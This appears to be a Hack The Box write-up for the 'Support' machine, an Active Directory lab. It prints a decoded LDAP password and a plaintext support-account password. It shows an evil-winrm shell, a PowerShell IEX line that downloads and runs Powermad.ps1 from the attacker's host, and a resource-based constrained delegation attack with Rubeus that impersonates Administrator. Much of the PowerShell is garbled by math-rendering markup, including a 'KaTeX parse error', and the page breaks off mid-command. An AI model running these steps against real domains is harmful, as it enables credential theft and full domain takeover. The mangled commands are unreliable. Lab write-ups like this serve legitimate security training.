<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="ie=edge" />
<link rel="stylesheet" href="/_assets/main.css" />

    <title>HTB Support - HTB Writeups</title>
  <link rel="stylesheet" href="/_markdown_plugin_assets/katex/katex.css" /></head>
  <body>
    <div class="main">
      <nav class="navigation">
        <a href="/">HTB Writeups</a>
      </nav>
      <article>
        <header>
          <h1 class="article-title">HTB Support</h1>
          <div class="article-info">
            <div>
              <span
                >Created At：<time datetime="1677613009160"
                  >2023-02-28 14:36</time
                ></span
              >
              <span
                >Updated At：<time datetime="1678122543635"
                  >2023-03-06 12:09</time
                ></span
              >
            </div>
            
          </div>
        </header>
        <div class="article-content markdown-body"><p>We start with a scan:<br />
nmap -Pn -sC -sV -oA nmap/initial 10.10.11.174<br />
<img src="/_resources/90a417aeaecb465e9ed5f54235e2b8c6.png" /></p>
<p>nmap -Pn -sC -sV -p- -oA nmap/full 10.10.11.174</p>
<p><img src="/_resources/217764dfa15a43baaad6a6a65cbc3e4d.png" /></p>
<p>We start enumerating smb:<br />
we use smbclient -N -L 10.10.11.174:<br />
<img src="/_resources/1e52f415750447e8b16ddedf3f59387a.png" /></p>
<p>Based on the ouput we gather that this is an AD Domain Controller<br />
now we attempt to read the sares<br />
smbclient -N <a title="//10.10.11.174/support-tools" href="//10.10.11.174/support-tools">//10.10.11.174/support-tools</a></p>
<p><img src="/_resources/d163b0073df547eb9b64d8501e673d0f.png" /></p>
<p>We see a list of files we can exfil<br />
We get the UserInfo.exe.zip file:<br />
<img src="/_resources/6eb60211b8704a8b81e82da736dd0de0.png" /><br />
We extract the files and start to read them:<br />
<img src="/_resources/323abd25e4b64c8898b800fe0a50ca49.png" /></p>
<p>What we learn initially from reading these files is that this is a .NetFramework file<br />
<img src="/_resources/44d45a4cd1fd4fd7a0080e48649dcc38.png" /><br />
<img src="/_resources/fee3165c85f240c092fa3883ecf953d7.png" /></p>
<p>We check to see whether we can execute this on our Kali machine:<br />
<img src="/_resources/743f7ad731044e53bd84e3b0f3a2613a.png" /></p>
<p>We cannot run the binary, so we download ILSpy from here:<br />
wget <a title="https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip" href="https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip">https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip</a></p>
<p>We unzip, and then run from the /opt/artifacts/linux-x64 dir<br />
sudo ./ILSpy<br />
We load the UserInfo.exe file into ILSpy:<br />
<img src="/_resources/49da4e9765254d4b8d98a01023c61f03.png" /></p>
<p>There are functions within this Binary that have some potentially useful information:<br />
<img src="/_resources/496162081506455085a3b54ca687919a.png" /></p>
<p>Apparently this executable queries the ldap server for userinfo.<br />
We add the ip address to the /etc/hosts file.</p>
<p>We don't have luck viewing the source code for the application with ILSpy, so we download DNSpy for Windows and run that on the native machine.<br />
<a title="https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8" href="https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8">https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8</a><br />
<img src="/_resources/026c4badfb5d46c6ae648aaf8dc1dce2.png" /></p>
<p>It appears that the userinfo.exe program calls the base64 encoded and decodes it with the key "armando" to pass it to the LDAP server to validate the correct credentials:<br />
<img src="/_resources/01147c9c2815476bbaa8c18a1c322576.png" /></p>
<p>We can create a python script to decode the password, but more simply we can use cyberchef:<br />
<a title="https://gchq.github.io/CyberChef/" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a><br />
We drag 'from base64' since the encrypted piece is base64. Next we drag XOR into the recipe section, and use the key 'armando' with UTF-8 and another XOR with 223 and Decimal:<br />
<img src="/_resources/fd2766d2a1574884a06fbdac23255ca8.png" /></p>
<p>This gives us the user ldap password:<br />
ldap:nvEfEK16^1aM4<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mn>7</mn><mi>A</mi><mi>c</mi><mi>l</mi><mi>U</mi><mi>f</mi><mn>8</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">e7AclUf8x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord">7</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10903em">U</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord">8</span><span class="mord mathnormal">x</span></span></span></span></span>tRWxPWO1%lmz</p>
<p>We test the credentials using crackmapexec:<br />
crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mn>7</mn><mi>A</mi><mi>c</mi><mi>l</mi><mi>U</mi><mi>f</mi><mn>8</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">e7AclUf8x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord">7</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10903em">U</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord">8</span><span class="mord mathnormal">x</span></span></span></span></span>tRWxPWO1%lmz'<br />
<img src="/_resources/89f5edfa8b7c46e7952033a70ac310fc.png" /></p>
<p>We installed mono and now are able to run the .exe file:<br />
sudo apt-get install mono<br />
sudo apt-get install mono-complete</p>
<p><img src="/_resources/1e872fbb1d5c467ea9d9613dba810992.png" /></p>
<p>We attempt to run bloodhound-python, but see that there is a domain we didn't add to the /etc/passwd file:<br />
<img src="/_resources/5da87374e35942da86935a98c11486bb.png" /></p>
<p>We add the entry and now the command executes:<br />
bloodhound-python --dns-tcp -ns 10.10.11.174 -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mn>7</mn><mi>A</mi><mi>c</mi><mi>l</mi><mi>U</mi><mi>f</mi><mn>8</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">e7AclUf8x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord">7</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10903em">U</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord">8</span><span class="mord mathnormal">x</span></span></span></span></span>tRWxPWO1%lmz' -c all</p>
<p><img src="/_resources/8bcca42d2a114bd1aba384a84c100a67.png" /></p>
<p>We open Bloodhound and import the json files that were collected using the ptython collector.<br />
Looking at the Unconstrained Delegation Systems tab under Analysis we see two computers that seem interesting since they appear to be non-standard machine accounts:<br />
<img src="/_resources/5d8e3ff5a32c4d68a89e7d70d83b3038.png" /><br />
Overall, Bloodhound is not giving us much useable information.</p>
<p>We need to examine the users from ldap, since that account didn't show up using Bloodhound.<br />
We tried using ldapsearch, but were unable to get any data:<br />
ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mn>7</mn><mi>A</mi><mi>c</mi><mi>l</mi><mi>U</mi><mi>f</mi><mn>8</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">e7AclUf8x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">e</span><span class="mord">7</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord mathnormal" style="margin-right:0.10903em">U</span><span class="mord mathnormal" style="margin-right:0.10764em">f</span><span class="mord">8</span><span class="mord mathnormal">x</span></span></span></span></span>tRWxPWO1%lmz'<br />
-b "dc=support,dc=htb" "*"</p>
<p>We instead try to use the GUI based Apache Directory Studio:<br />
<a title="https://directory.apache.org/studio/downloads.html" href="https://directory.apache.org/studio/downloads.html">https://directory.apache.org/studio/downloads.html</a></p>
<p>We will connect the ldap:<br />
<img src="/_resources/96c7694e391b43329ebf99d886688bd5.png" /><br />
We add a connection by clicking in the Connections window:<br />
<img src="/_resources/cb7250a1a07845979de5219b3d4987ad.png" /><br />
<img src="/_resources/05775da73b44428fa40322d9262b3b61.png" /><br />
Now we have output:<br />
<img src="/_resources/bb21a6fd93be4032ae51dad0d888a0ab.png" /></p>
<p>Since we know that a short path the DC is the support account, we can look at the info for that account. We find a plaintext password there:<br />
<img src="/_resources/408a1b12450f4a12a5eeecb48cb06659.png" /></p>
<p>support:Ironside47pleasure40Watchful</p>
<p>We know that user has remote access, so we can use evil-winrm to access a shell on the machine:<br />
evil-winrm -u support -p Ironside47pleasure40Watchful -i support.htb<br />
<img src="/_resources/484c07e3e70d4c5ba414138dc60d44ae.png" /></p>
<p>In Bloodhound we mark the support user as owned.<br />
Looking at the Node info on the support user, under the Outbound Object Control, and then Group Delegated Object Control, we can see what this user has rights to do on the DC:<br />
<img src="/_resources/39f37902c24c4a06827158c1ff95dd1b.png" /></p>
<p>Because the group that support belongs to has 'generic all' rights, we can find a Privilege escalation by right clicking on the 'generic all' then selecting help, and seeing the Abuse Info. Details for an attack are laid out in detail, and all we need to do is follow the steps therein.<br />
<img src="/_resources/86f860f1c2634fcc80c587f351526d4e.png" /><br />
According to the instructions we need Rubeus, Powerview/Powersploit, and Powermad.</p>
<p>What the attack allows us to do is create a new machine then use that machine to act as a machine with higher privileges.<br />
We need to download these:<br />
<a title="https://github.com/Kevin-Robertson/Powermad" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a><br />
<a title="https://github.com/Flangvik/SharpCollection" href="https://github.com/Flangvik/SharpCollection">https://github.com/Flangvik/SharpCollection</a> (for Rubeus)<br />
and we already had PowerView.ps1<br />
We use curl and powershell IEX to execute the files on the evil-winrm session:<br />
IEX(New-Object Net.WebClient).downloadString('<a title="http://10.10.14.6/Powermad.ps1" href="http://10.10.14.6/Powermad.ps1">http://10.10.14.6/Powermad.ps1</a>')</p>
<p><img src="/_resources/cba8a9abc392470593efa73b64c5fcac.png" /></p>
<p>The instructions for the attack are as follows:<br />
New-MachineAccount -MachineAccount attackersystem -Password <span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>C</mi><mi>o</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>T</mi><mi>o</mi><mo>−</mo><mi>S</mi><mi>e</mi><mi>c</mi><mi>u</mi><mi>r</mi><mi>e</mi><mi>S</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><msup><mi>g</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>S</mi><mi>u</mi><mi>m</mi><mi>m</mi><mi>e</mi><mi>r</mi><mn>2018</mn><msup><mo stretchy="false">!</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>−</mo><mi>A</mi><mi>s</mi><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>T</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>−</mo><mi>F</mi><mi>o</mi><mi>r</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em">v</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal" style="margin-right:0.13889em">tT</span><span class="mord mathnormal">o</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em"></span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">u</span><span class="mord mathnormal">re</span><span class="mord mathnormal">St</span><span class="mord mathnormal" style="margin-right:0.02778em">r</span><span class="mord mathnormal">in</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em"><span style="top:-3.063em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal">u</span><span class="mord mathnormal">mm</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord">2018</span><span class="mclose"><span class="mclose">!</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em"><span style="top:-3.063em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em">Pl</span><span class="mord mathnormal">ain</span><span class="mord mathnormal" style="margin-right:0.13889em">T</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord mathnormal" style="margin-right:0.13889em">F</span><span class="mord mathnormal">orce</span><span class="mclose">)</span></span></span></span></span>ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid<br />
<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>D</mi><mo>=</mo><mi>N</mi><mi>e</mi><mi>w</mi><mo>−</mo><mi>O</mi><mi>b</mi><mi>j</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>S</mi><mi>e</mi><mi>c</mi><mi>u</mi><mi>r</mi><mi>i</mi><mi>t</mi><mi>y</mi><mi mathvariant="normal">.</mi><mi>A</mi><mi>c</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>C</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>l</mi><mi mathvariant="normal">.</mi><mi>R</mi><mi>a</mi><mi>w</mi><mi>S</mi><mi>e</mi><mi>c</mi><mi>u</mi><mi>r</mi><mi>i</mi><mi>t</mi><mi>y</mi><mi>D</mi><mi>e</mi><mi>s</mi><mi>c</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>t</mi><mi>o</mi><mi>r</mi><mo>−</mo><mi>A</mi><mi>r</mi><mi>g</mi><mi>u</mi><mi>m</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>L</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">"</mi><mi>O</mi><mo>:</mo><mi>B</mi><mi>A</mi><mi>D</mi><mo>:</mo><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">;</mo><mo separator="true">;</mo><mi>C</mi><mi>C</mi><mi>D</mi><mi>C</mi><mi>L</mi><mi>C</mi><mi>S</mi><mi>W</mi><mi>R</mi><mi>P</mi><mi>W</mi><mi>P</mi><mi>D</mi><mi>T</mi><mi>L</mi><mi>O</mi><mi>C</mi><mi>R</mi><mi>S</mi><mi>D</mi><mi>R</mi><mi>C</mi><mi>W</mi><mi>D</mi><mi>W</mi><mi>O</mi><mo separator="true">;</mo><mo separator="true">;</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em"></span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em"></span><span class="mord mathnormal" style="margin-right:0.10903em">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em">w</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal" style="margin-right:0.02778em">O</span><span class="mord mathnormal" style="margin-right:0.05724em">bj</span><span class="mord mathnormal">ec</span><span class="mord mathnormal" style="margin-right:0.05764em">tS</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em">y</span><span class="mord">.</span><span class="mord mathnormal">A</span><span class="mord mathnormal">ccess</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ro</span><span class="mord mathnormal" style="margin-right:0.01968em">l</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.00773em">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05764em">wS</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em">yDescr</span><span class="mord mathnormal">i</span><span class="mord mathnormal">pt</span><span class="mord mathnormal" style="margin-right:0.02778em">or</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em">r</span><span class="mord mathnormal">gu</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">L</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord">"</span><span class="mord mathnormal" style="margin-right:0.02778em">O</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em"></span><span class="mord mathnormal" style="margin-right:0.05017em">B</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">;;</span><span class="mspace" style="margin-right:0.16666666666666666em"></span><span class="mord mathnormal" style="margin-right:0.07153em">CC</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em">CS</span><span class="mord mathnormal" style="margin-right:0.13889em">W</span><span class="mord mathnormal" style="margin-right:0.13889em">RP</span><span class="mord mathnormal" style="margin-right:0.13889em">W</span><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord mathnormal" style="margin-right:0.13889em">T</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em">OCRS</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord mathnormal" style="margin-right:0.07153em">RC</span><span class="mord mathnormal" style="margin-right:0.13889em">W</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord mathnormal" style="margin-right:0.13889em">W</span><span class="mord mathnormal" style="margin-right:0.02778em">O</span><span class="mpunct">;;;</span></span></span></span></span>(<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>m</mi><mi>p</mi><mi>u</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>S</mi><mi>i</mi><mi>d</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">"</mi></mrow><annotation encoding="application/x-tex">ComputerSid))"
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">m</span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mclose">))</span><span class="mord">"</span></span></span></span></span>SDBytes = New-Object byte[] (<span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>D</mi><mi mathvariant="normal">.</mi><mi>B</mi><mi>i</mi><mi>n</mi><mi>a</mi><mi>r</mi><mi>y</mi><mi>L</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">SD.BinaryLength)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord mathnormal" style="margin-right:0.05764em">S</span><span class="mord mathnormal" style="margin-right:0.02778em">D</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.05017em">B</span><span class="mord mathnormal">ina</span><span class="mord mathnormal" style="margin-right:0.03588em">ry</span><span class="mord mathnormal">L</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em">g</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span></span>SD.GetBinaryForm($SDBytes, 0)<br />
Get-DomainComputer <span><div>KaTeX parse error: Expected '}', got 'EOF' at end of input: …otheridentity'=</div></span>SDBytes}</p>
<p>.\Rubeus.exe hash /password:Summer2018!<br />
<img src="/_resources/f55e7a5e8ea448d288aa5f9c30ab275e.png" /></p>
<p>.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt</p>
<p><img src="/_resources/c01742fc0dcc42bba7c121a377bfb270.png" /></p>
<p>Although we had some errors, we got a kerberos ticket:<br />
<img src="/_resources/0f90461560ff4677b1b3fc08c4ad3e9e.png" /><br />
<img src="/_resources/08da5f52d8644ff7bc76c03dc4b86a01.png" /><br />
<img src="/_resources/5fc4bead2e2e48a2951728b02e1ceaeb.png" /></p>
<p>We then copy the ticket to our machine, and use impacket to login to the machine using the ticket:<br />
First we need to transform the format from base64, then use impacket's ticketConverter.py to change the format into a linux based file:<br />
base64 -d ticket.kirbi.b64 &gt; ticket.kirbi<br />
ticketConverter.py ticket.kirbi ticket.ccache<br />
<img src="/_resources/7c9181ee5ecd41469e99c21da2f44697.png" /></p>
<p><span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>a</mi><mi>w</mi><mi>B</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mo>=</mo><mi>G</mi><mi>e</mi><mi>t</mi><mo>−</mo><mi>D</mi><mi>o</mi><mi>m</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>C</mi><mi>o</mi><mi>m</mi><mi>p</mi><mi>u</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>D</mi><mi>C</mi><mo>−</mo><mi>P</mi><mi>r</mi><mi>o</mi><mi>p</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>e</mi><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>m</mi><mi>s</mi><mi>d</mi><mi>s</mi><mo>−</mo><mi>a</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>d</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>n</mi><mi>b</mi><mi>e</mi><mi>h</mi><mi>a</mi><mi>l</mi><mi>f</mi><mi>o</mi><mi>f</mi><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>t</mi><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mi>e</mi><mi>l</mi><mi>e</mi><mi>c</mi><mi>t</mi><mo>−</mo><mi>e</mi><mi>x</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi>m</mi><mi>s</mi><mi>d</mi><mi>s</mi><mo>−</mo><mi>a</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>d</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>n</mi><mi>b</mi><mi>e</mi><mi>h</mi><mi>a</mi><mi>l</mi><mi>f</mi><mi>o</mi><mi>f</mi><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>t</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal" style="margin-right:0.00773em">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em">wB</span><span class="mord mathnormal" style="margin-right:0.03588em">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mspace" style="margin-right:0.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em"></span><span class="mord mathnormal">G</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em"></span><span class="mord mathnormal">Do</span><span class="mord mathnormal">main</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">m</span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em">erD</span><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em"></span><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em">er</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em"><span style="top:-3.063em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal">d</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" 